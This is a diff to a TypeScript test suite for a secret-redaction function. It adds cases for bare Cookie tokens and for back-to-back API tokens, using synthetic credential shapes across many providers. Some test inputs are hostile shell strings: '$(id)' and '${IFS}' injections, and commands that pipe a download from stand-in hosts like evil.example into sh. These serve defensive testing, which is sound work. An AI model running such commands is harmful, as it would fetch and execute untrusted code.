@@ -30,7 +30,7 @@ const FAMILIES: Record<string, string[]> = {
   hosting: ['HR' + 'KU-' + an(60), 'fo' + '1_' + an(43), 'fm' + '1r_' + an(120), 'fm' + '2_' + an(120), 'vc' + 'p_' + an(50), 'vc' + 'k_' + an(50)],
   databases: ['sb' + 'p_' + hex(40), 'sb_' + 'secret_' + an(30), 'na' + 'pi_' + lo(50), 'psc' + 'ale_tkn_' + an(40), 'psc' + 'ale_pw_' + an(40), 'psc' + 'ale_oauth_' + an(40), 'Ast' + 'raCS:' + an(24) + ':' + hex(64), '4b' + '1d' + an(38), 'da' + 'pi' + hex(32)],
   infra: [an(14) + '.at' + 'lasv1.' + an(70), 'hv' + 's.' + an(90), 'hv' + 'b.' + an(140), 'dp' + '.pt.' + an(43), 'dp' + '.st.' + an(43), 'pu' + 'l-' + hex(40), 'op' + 's_eyJ' + an(250), 'A3' + '-' + up(6) + '-' + up(11) + '-' + up(5) + '-' + up(5) + '-' + up(5), 'AGE-' + 'SECRET-KEY-1' + up(58), 'ts' + 'key-' + an(40), 'sha' + '256~' + an(43)],
-  github: ['gh' + 'p_' + an(36), 'gh' + 'o_' + an(36), 'gh' + 'u_' + an(36), 'gh' + 's_' + an(36), 'gh' + 'r_' + an(36), 'github' + '_pat_' + an(82)],
+  github: ['gh' + 'p_' + an(36), 'gh' + 'o_' + an(36), 'gh' + 'u_' + an(36), 'gh' + 's_' + an(36), 'gh' + 'r_' + an(36), 'github' + '_pat_' + an(22) + '_' + an(59)],
   gitlab: ['gl' + 'pat-' + an(20), 'gl' + 'dt-' + an(20), 'gl' + 'rt-' + an(20), 'gl' + 'ft-' + an(20), 'gl' + 'ffct-' + an(20), 'gl' + 'imt-' + an(25), 'gl' + 'agent-' + an(50), 'gl' + 'oas-' + an(64), 'gl' + 'soat-' + an(20), 'gl' + 'ptt-' + hex(40), 'gl' + 'cbt-a1_' + an(20), 'GR' + '1348941' + an(20)],
   atlassian: ['ATA' + 'TT3' + an(40)],
   ci: ['CCI' + 'PAT_' + an(30), 'CCI' + 'PRJ_' + an(30), 'sg' + 'p_' + hex(40), 'pa' + 't.' + an(22) + '.' + an(24) + '.' + an(20), 'PM' + 'AK-' + hex(24) + '-' + hex(34)],
@@ -39,7 +39,7 @@ const FAMILIES: Record<string, string[]> = {
   registries: ['np' + 'm_' + an(36), 'py' + 'pi-Ag' + an(60), 'ruby' + 'gems_' + hex(48), 'CLO' + 'JARS_' + lo(60), 'AK' + 'Cp' + an(69), 'cm' + 'Vmd' + an(59), 'dc' + 'kr_pat_' + an(27)],
   mail: ['SG' + '.' + an(22) + '.' + an(43), 'ke' + 'y-' + hex(32), hex(32) + '-' + 'us12', 'xke' + 'ysib-' + hex(64) + '-' + an(16), 're' + '_' + an(8) + '_' + an(24), 'S' + 'K' + hex(32), 'EA' + 'AC' + an(120), '1234567' + '89012345' + '|' + an(30), 'A'.repeat(22) + 'B' + an(30) + '%2B' + an(60)],
   payment: ['sk' + '_live_' + an(24), 'rk' + '_live_' + an(24), 'sk' + '_test_' + an(24), 'wh' + 'sec_' + an(32), 'sq' + '0atp-' + an(22), 'sq' + '0csp-' + an(43), 'EA' + 'AA' + an(60), 'rz' + 'p_live_' + an(14), 'FLW' + 'SECK-' + an(32) + '-X', 'access-' + 'production-' + hex(8) + '-' + hex(4) + '-' + hex(4) + '-' + hex(4) + '-' + hex(12), 'sh' + 'pat_' + hex(32), 'sh' + 'pss_' + hex(32), 'pd' + 'l_live_' + an(40), 'duf' + 'fel_live_' + an(43)],
-  devTools: ['li' + 'n_api_' + an(40), 'nt' + 'n_' + an(46), 'sn' + 'tryu_' + hex(64), 'sn' + 'trys_' + an(80), 'gl' + 'c_' + an(40), 'gl' + 'sa_' + an(32) + '_' + hex(8), 'NR' + 'AK-' + up(27), 'NR' + 'II-' + an(32), 'NR' + 'JS-' + hex(19), 'dt' + '0c01.' + up(24) + '.' + up(64), 'ph' + 'x_' + an(40), 'sl' + '.' + an(135), 'pa' + 't' + an(14) + '.' + hex(64), 'pn' + 'u_' + an(36), 'rd' + 'me_' + lo(70), 'ship' + 'po_live_' + hex(40), 'EZ' + 'AK' + an(54), 'ic' + 'o-' + an(32), 'AP' + 'I-' + up(26), 'fi' + 'o-u-' + an(64), 's-' + 's4t2ud-' + hex(64), an(6) + '_' + an(29) + '_mmk', 'sm' + '_pat_' + an(16), 'tk' + '-us-' + an(48), 'p8' + 'e-' + an(32), 'sc' + '_' + an(10) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40), 'eyJ' + 'rIjoi' + an(80)],
+  devTools: ['li' + 'n_api_' + an(40), 'nt' + 'n_' + an(46), 'sn' + 'tryu_' + hex(64), 'sn' + 'trys_' + an(80), 'gl' + 'c_' + an(40), 'gl' + 'sa_' + an(32) + '_' + hex(8), 'NR' + 'AK-' + up(27), 'NR' + 'II-' + an(32), 'NR' + 'JS-' + hex(19), 'dt' + '0c01.' + up(24) + '.' + up(64), 'ph' + 'x_' + an(40), 'sl' + '.' + an(135), 'pa' + 't' + an(14) + '.' + hex(64), 'pn' + 'u_' + an(36), 'rd' + 'me_' + lo(70), 'ship' + 'po_live_' + hex(40), 'EZ' + 'AK' + an(54), 'ic' + 'o-' + an(32), 'AP' + 'I-' + up(26), 'fi' + 'o-u-' + an(64), 's-' + 's4t2ud-' + hex(64), an(6) + '_' + an(29) + '_mmk', 'sm' + '_pat_' + an(16), 'tk' + '-us-' + an(48), 'p8' + 'e-' + an(32), 'sc' + '_' + an(10) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40), 'eyJ' + 'rIjoi' + an(80), 'sc' + '_' + an(30) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40), 'authress' + '_' + an(30) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40)],
   skAntGlued: ['x' + 'sk-ant-' + an(8), '1' + 'sk-ant-' + an(12)],
   bearer: ['Bea' + 'rer ' + an(30)],
   jwt: ['ey' + 'J' + an(20) + '.ey' + 'J' + an(30) + '.' + an(30)],
@@ -124,6 +124,61 @@ for (const [input, want] of [
   ['**token: abc12345** stays', '**token: [redacted]** stays'], ['{"h":"Coo' + 'kie: sid=1","next":"keep me","url":"https://h"}', '{"h":"Cookie: [redacted]","next":"keep me","url":"https://h"}'], ['(token=abc12345) and more', '(token=[redacted]) and more'],
   ['{"a":"Coo' + 'kie: x=1","b":"Coo' + 'kie: y=2"}', '{"a":"Cookie: [redacted]","b":"Cookie: [redacted]"}'], ['set-coo' + 'kie: sid=abc123; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/', 'set-cookie: [redacted]; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/'],
 ]) assert.strictEqual(redact(input, {}), want, `stop rule: ${input.slice(0, 40)}`);
+// A Cookie or Set-Cookie header whose value has no `=` (one opaque token) is hidden whole (spec 012 FR-168, issue #1159).
+{
+  const T = 'Tq7' + 'Zk2Xp9Lm4Vb8Nc1Rd5Sf6Gh3Jw0'; // made up
+  const C = 'Coo' + 'kie';
+  const R = '[redacted]';
+  assert.strictEqual(redact(`${C}: EnvSecretValue123; ${T}`, { MY_TOKEN: 'EnvSecretValue123' }), `${C}: ${R}`, 'bare cookie token: a token after an env value');
+  for (const [input, want, why] of [
+    [`${C}: ${T}`, `${C}: ${R}`, 'opaque token'],
+    [`Set-${C}: ${T}; Path=/; HttpOnly`, `Set-${C}: ${R}; HttpOnly`, 'Set-Cookie token: the pairs after it go too, as after a pair'],
+    [`${C}: a=1; ${T}`, `${C}: ${R}`, 'pair then a bare token'],
+    [`${C}: ${T}; a=1`, `${C}: ${R}`, 'bare token then a short pair'],
+    [`${C}: a=1; ${T}; sid=LongSecretVal99`, `${C}: ${R}`, 'a pair after a bare token is scanned too'],
+    [`coo` + `kie: ${T}`, `cookie: ${R}`, 'lower-case name'],
+    [`COO` + `KIE: ${T}\r\nHost: x`, `COOKIE: ${R}\r\nHost: x`, 'upper case, CRLF'],
+    [`${C}: ${T}\nHost: x`, `${C}: ${R}\nHost: x`, 'line feed ends it'],
+    [`${C}: ${T}\t`, `${C}: ${R}\t`, 'a tab after it'],
+    [`${C}: ${T}   `, `${C}: ${R}   `, 'spaces after it'],
+    [`${C}: ${T} ;Path=/`, `${C}: ${R} ;Path=/`, 'space then ;'],
+    [`${C}: abcdefgh`, `${C}: ${R}`, 'exactly 8 characters'],
+    [`${C}: sid=abcdefgh12; my words here`, `${C}: ${R}; my words here`, 'words after pairs stay'],
+    [`${C}: ${T}|tail`, `${C}: ${R}|tail`, 'pipe'],
+    [`${C}: ${T} | jq .`, `${C}: ${R} | jq .`, 'spaced pipe'],
+    [`${C}: ${T}&x`, `${C}: ${R}&x`, 'ampersand'],
+    [`${C}: ${T}\x60x\x60`, `${C}: ${R}\x60x\x60`, 'backtick'],
+    [`${C}: ${T}$(id)`, `${C}: ${R}$(id)`, 'command substitution'],
+    [`${C}: ${T}\${IFS}x`, `${C}: ${R}\${IFS}x`, 'parameter expansion'],
+    [`(${C}: ${T})`, `(${C}: ${R})`, 'round bracket'],
+    [`{${C}: ${T}}`, `{${C}: ${R}}`, 'curly bracket'],
+    [`[${C}: ${T}]`, `[${C}: ${R}]`, 'square bracket'],
+    [`<${C}: ${T}>`, `<${C}: ${R}>`, 'angle bracket'],
+    [`${C}: ${T},other`, `${C}: ${R}`, 'comma stays inside the token'],
+    [`${C}: "${T}"`, `${C}: ${R}`, 'double-quoted'],
+    [`${C}: '${T}'`, `${C}: ${R}`, 'single-quoted'],
+    [`${C}: Set-${C}:\nsid=LongSecretVal99`, `${C}: Set-${C}:\n${R}`, 'a head is not a token (the next head still masks its pair)'],
+    [`${C}: ${T}\nok`, `${C}: ${R}\nok`, 'next line after it stays'],
+    [`curl -H '${C}: ${T}' https://x.example`, `curl -H '${C}: ${R}' https://x.example`, 'curl -H argument'],
+    [`{"h":"${C}: ${T}","next":"keep"}`, `{"h":"${C}: ${R}","next":"keep"}`, 'inside a JSON string'],
+    [`{\\"h\\":\\"${C}: ${T}\\"}`, `{\\"h\\":\\"${C}: ${R}\\"}`, 'JSON-escaped string'],
+    [`{"${C}": "${T}"}`, `{"${C}": "${R}"}`, 'JSON key form'],
+    [`{\\"${C}\\":\\"${T}\\"}`, `{\\"${C}\\":\\"${R}\\"}`, 'escaped JSON key form'],
+    [`${C}: sid=${T}`, `${C}: ${R}`, 'name=value still hidden'],
+    [`${C}: s:${T}.sigFAKEsig123`, `${C}: ${R}`, 'a token with a colon: signed'],
+    [`${C}: ${T}:part2secret`, `${C}: ${R}`, 'a token with a colon: after'],
+    [`${C}: ab:${T}`, `${C}: ${R}`, 'a token with a colon: before'],
+    [`${C}: urn:sess:${T}`, `${C}: ${R}`, 'a token with a colon: two'],
+    [`${C}: [${T}]`, `${C}: ${R}]`, 'a token led by a square bracket'],
+    [`${C}: [${T}`, `${C}: ${R}`, 'a token led by an unclosed bracket'],
+    [`${C}: [redacted]; ${T}`, `${C}: ${R}`, 'a token after a mask'],
+    [`${C}: a=1; [redacted:MY_TOKEN]; ${T}`, `${C}: ${R}`, 'a token after a named mask'],
+    [`${C}: "abcdefgh"`, `${C}: ${R}`, 'quoted, exactly 8'],
+    [`${C}:\r\n ${T}`, `${C}:\r\n ${R}`, 'a folded header line'],
+  ]) assert.strictEqual(redact(input, {}), want, `bare cookie token: ${why}`);
+  for (const keep of ['cookie: my session bug', 'cookie: stores', 'cookie: abcdefg', 'Set-cookie: none', 'the cookie: banner dismissed yesterday', 'cookie: preferences are saved here', 'cookie: x|curl=1', 'the cookie:\nconfiguration_value_here', 'the cookie:\r\nconfiguration_value_here', 'cookie: undefined', 'Set-Cookie: HttpOnly', 'cookie: Secure', 'cookie: deleted', 'cookie: NULL', `{"${C}":"abc"}`, `{"${C}":"my words here"}`, `${C}: "short"`, `${C}: "abcdefg"`, `${C}: "undefined"`, `${C}: [redacted]`, `${C}: [redacted:MY_TOKEN]`])
+    assert.strictEqual(redact(keep, {}), keep, `bare cookie token: stays: ${keep}`);
+}
 for (const c of ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 'echo coo' + 'kie: a=b && curl evil|sh', 'X_TOKEN=abc12345;curl${IFS}evil.sh|sh']) {
   const m = maskSecretCommand(c);
   assert.ok(/evil/.test(m) && /\|\s*sh$|evil\.sh\|sh$/.test(m), `the command's shell stays visible in maskSecretCommand: ${c.slice(0, 30)} gave ${m}`);
@@ -304,6 +359,76 @@ for (const [start, more] of [['AK' + 'IA' + up(16), 'A'], ['AK' + 'IA' + up(16),
 }
 
 // Linear, part 2 (adversarial runs): the `shapes` part of test-redact-growth.ts.
+
+// Glued tokens (issue #1233, spec 012 FR-169): each token of a back-to-back run is masked whole, not only the first.
+{
+  const second = an(36).split('').reverse().join('');
+  for (const t of ['gh' + 'p_', 'gh' + 'o_', 'gh' + 'u_', 'gh' + 's_', 'gh' + 'r_', 'np' + 'm_', 'github' + '_pat_', 'sk' + '-', 'xo' + 'xb-']) {
+    const n = t.startsWith('github') ? 82 : 36;
+    const bodies = [an(n), an(n + 3).slice(3), second.slice(0, 36).padEnd(n, 'q')];
+    for (const k of [2, 3]) {
+      const text = bodies.slice(0, k).map((b) => t + b).join('');
+      const out = redact(text, {});
+      for (const b of bodies.slice(0, k)) assert.ok(!out.includes(b.slice(0, 12)) && !out.includes(b.slice(-12)), `glued x${k}: ${t}… leaves a body readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
+      assert.strictEqual(out, '[redacted]', `glued x${k}: ${t}… is one mask`);
+    }
+  }
+  // Every sample of every bare-token family, twice and three times back to back: one mask, nothing readable. A family added to FAMILIES is covered by this loop.
+  const CONTEXT = new Set(['authorization', 'cookie', 'cookieQuoted', 'curlUser', 'urlCredential', 'copilotTid', 'queryValue', 'named', 'netrc', 'bearer', 'jwt', 'keyBlock', 'slackHook', 'discordHook', 'teamsHook', 'telegram', 'discordBot', 'slackLegacy', 'skAntGlued']);
+  /** `[KNOWN GAP]` (spec 012 FR-169): shapes whose body has a fixed length and must END on a character that is not a letter or digit (`NOT_AFTER`, `NOT_B64_AFTER`), so a glued run is not a token at all. The loop checks each stays unmasked, so a fix that covers one fails here until it leaves the list. */
+  const GLUE_GAP = new Set(['AKIAAB3D', 'ASIAAB3D', 'ABIAAB3D', 'ACCAAB3D', 'A3TAAB3D', 'ABSKaB3d', 'AIzaaB3d', 'aB38Q~aB', '_a.8Q~aB', '~ab8Q~aB', '.ab8Q~aB', '1//0aB3d', 'oy2a3b6c', 'cioaB3dE', '4b1daB3d', 'dapi0a1b', 'cmVmdaB3', 'key-0a1b', '0a1b2c3d', 'SK0a1b2c', '12345678', 'ico-aB3d', 'API-AB3D', 'EAAAaB3d']);
+  let glueTested = 0;
+  for (const [family, samples] of Object.entries(FAMILIES)) {
+    if (CONTEXT.has(family)) continue;
+    for (const sample of samples) {
+      const wholes = [2, 3].map((k) => {
+        const out = redact(sample.repeat(k), {});
+        const whole = out.includes('[redacted]') && !/[A-Za-z0-9]{8}/.test(out.replace(/\[redacted\]/g, ''));
+        if (!whole && !GLUE_GAP.has(sample.slice(0, 8))) assert.fail(`${family}: glued x${k} of ${sample.slice(0, 8)}… leaves a body readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>').slice(0, 80)}`);
+        return whole;
+      });
+      if (GLUE_GAP.has(sample.slice(0, 8))) assert.ok(wholes.includes(false), `${family}: ${sample.slice(0, 8)}… glued is now masked: take it off GLUE_GAP`);
+      else glueTested += 2;
+    }
+  }
+  assert.ok(glueTested > 150, `the glued loop ran: ${glueTested}`);
+  // Every ordered pair of the GitHub and npm families (issue #1233, review of PR #1235), at their real lengths: `github_pat_` is 22 characters, `_`, 59 characters.
+  {
+    const ALNUM = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let seed = 20261106; // seeded, so a failing chain fails the same way
+    const rnd = (n: number): number => { seed = (Math.imul(seed, 1103515245) + 12345) >>> 0; return (seed >>> 8) % n; };
+    const chars = (n: number): string => { let o = ''; for (let i = 0; i < n; i++) o += ALNUM[rnd(ALNUM.length)]; return o; };
+    const fam: Array<[string, () => string]> = [['gh' + 'p_', () => chars(36)], ['gh' + 'o_', () => chars(36)], ['gh' + 'u_', () => chars(36)], ['gh' + 's_', () => chars(36)], ['gh' + 'r_', () => chars(36)], ['github' + '_pat_', () => chars(22) + '_' + chars(59)], ['np' + 'm_', () => chars(36)]];
+    const check = (parts: Array<[string, string]>, label: string): void => {
+      const out = redact(parts.map(([p2, b]) => p2 + b).join(''), {});
+      for (const [, b] of parts) for (const piece of b.split('_')) assert.ok(!out.includes(piece.slice(0, 12)) && !out.includes(piece.slice(-12)), `${label}: a body is readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
+      assert.strictEqual(out, '[redacted]', `${label}: one mask`);
+    };
+    for (const [a, ga] of fam) for (const [b, gb] of fam) {
+      const A: [string, string] = [a, ga()];
+      const B: [string, string] = [b, gb()];
+      check([A, B], `pair ${a}${b}`);
+      check([A, B, A], `triple ${a}${b}${a}`);
+      check([A, B, B], `triple ${a}${b}${b}`);
+    }
+    // seeded chains of 2 to 5 tokens from the three families
+    for (let i = 0; i < 600; i++) {
+      const n = 2 + rnd(4);
+      const parts: Array<[string, string]> = [];
+      for (let k = 0; k < n; k++) { const [pre, g] = fam[rnd(fam.length)]; parts.push([pre, g()]); }
+      check(parts, `chain ${i}: ${parts.map(([p2]) => p2).join('')}`);
+    }
+  }
+  // F1: a plain list of prefixes is no token (the `_` after a lead counts only after a full body of letters and digits)
+  for (const t of ['the prefixes ' + 'gh' + 'p_gho_ghu_ghs_ghr_gh' + 'p_gho_ghu_', ('gh' + 'p_').repeat(40), ('np' + 'm_gh' + 'p_').repeat(20)]) assert.strictEqual(redact(t, {}), t, `a prefix list stays: ${t.slice(0, 30)}`);
+  // The lookbehind is only for a lead the swallow list names: a body ending in `gh` and another letter, then `_`, is not glued
+  assert.strictEqual(redact('gh' + 'p_' + an(20) + 'ghx_' + an(8), {}), '[redacted]_' + an(8), 'a body ending in ghx stops at the underscore');
+  // The extension never shortens a mask: a token starting inside the first one and ending before its end changes nothing
+  assert.strictEqual(redact('cf' + 'ut_' + an(40) + 'AB' + 'IA' + up(16) + '-xyz', {}), '[redacted]', 'the mask only grows');
+  // A glued short rest after a token (no full body) is still taken, as before; a space or a word between keeps both masked
+  assert.ok(!redact('gh' + 'p_' + an(36) + 'gh' + 'p_' + an(8), {}).includes('gh' + 'p_'), 'a short glued rest');
+  assert.strictEqual(redact(['gh' + 'p_' + an(36), 'gh' + 'o_' + an(36)].join(' x '), {}), '[redacted] x [redacted]', 'separated tokens');
+}
 
 // A real image, whole, stays (every repo image: test-redact-images.ts).
 {
